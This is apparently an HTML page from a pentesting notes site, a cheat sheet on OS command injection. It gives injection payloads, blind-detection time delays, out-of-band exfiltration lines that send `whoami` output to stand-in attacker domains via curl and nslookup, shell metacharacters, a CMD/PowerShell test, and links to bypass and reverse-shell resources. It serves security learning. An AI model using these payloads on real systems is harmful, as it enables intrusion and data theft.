@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn about OS command injection vulnerabilities, detection methods, and exploitation techniques. Understand how to bypass restrictions and use metacharacters for injecting commands in both Windows and Unix systems.">
+  <title>offsecnotes | OS command injection</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>OS command injection</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#command-injection" id="toc-command-injection">Command injection</a></li>
+<li><a href="#blind-os-command" id="toc-blind-os-command">Blind OS command</a></li>
+<li><a href="#bypass-restriction" id="toc-bypass-restriction">Bypass restriction</a></li>
+<li><a href="#metacharacters" id="toc-metacharacters">Metacharacters</a></li>
+<li><a href="#identify-cmd-or-powershell" id="toc-identify-cmd-or-powershell">Identify CMD or PowerShell</a></li>
+<li><a href="#reverse-shell-generator" id="toc-reverse-shell-generator">Reverse Shell Generator</a></li>
+</ul></div>
+  <hr>
+<h2 id="command-injection">Command injection</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="bu">echo</span> qwerty <span class="kw">&amp;</span></span></code></pre></div>
+<p>Placing <code>&amp;</code> after the injected command is generally useful because it separates the injected command from whatever follows the injection point.</p>
+<hr />
+<h2 id="blind-os-command">Blind OS command</h2>
+<p><strong>Detection</strong></p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 10 sec. time delay</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="fu">ping</span> <span class="at">-c</span> 10 127.0.0.1 <span class="kw">&amp;</span></span></code></pre></div>
+<p><strong>Exploit</strong></p>
+<ol type="1">
+<li><p>Redirecting output. Note: you must have write permission</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="fu">whoami</span> <span class="op">&gt;</span> /var/www/static/whoami.txt <span class="kw">&amp;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> https://website.com/whoami.txt</span></code></pre></div></li>
+<li><p>Out-of-band techniques</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="ex">curl</span> <span class="kw">`</span><span class="fu">whoami</span><span class="kw">`</span>.webserver-attacker.com <span class="kw">&amp;</span> <span class="co"># HTTP traffic may be blocked</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="ex">nslookup</span> <span class="kw">`</span><span class="fu">whoami</span><span class="kw">`</span>.kgji2ohoyw.web-attacker.com <span class="kw">&amp;</span></span></code></pre></div></li>
+<li><p>Open a shell</p></li>
+</ol>
+<hr />
+<h2 id="bypass-restriction">Bypass restriction</h2>
+<p>There are so many ways: <a href="https://book.hacktricks.wiki/linux-hardening/bypass-bash-restrictions/index.html">https://book.hacktricks.wiki/linux-hardening/bypass-bash-restrictions/index.html</a></p>
+<hr />
+<h2 id="metacharacters">Metacharacters</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Windows &amp; Unix</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;&amp;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="kw">||</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Unix</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Unix inline execution</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="kw">`</span><span class="bu">command</span><span class="kw">`</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="va">$(</span><span class="bu">command</span><span class="va">)</span></span></code></pre></div>
+<hr />
+<h2 id="identify-cmd-or-powershell">Identify CMD or PowerShell</h2>
+<p>To determine whether commands are executed by PowerShell or CMD, use this snippet:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="bu">dir</span> <span class="kw">2&gt;&amp;1</span> *`<span class="kw">|</span><span class="bu">echo</span> CMD<span class="kw">)</span>;<span class="kw">&amp;&lt;</span># <span class="co">rem #</span><span class="er">&gt;</span><span class="co">echo PowerShell</span></span></code></pre></div>
+<hr />
+<h2 id="reverse-shell-generator">Reverse Shell Generator</h2>
+<p>https://www.revshells.com/</p>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
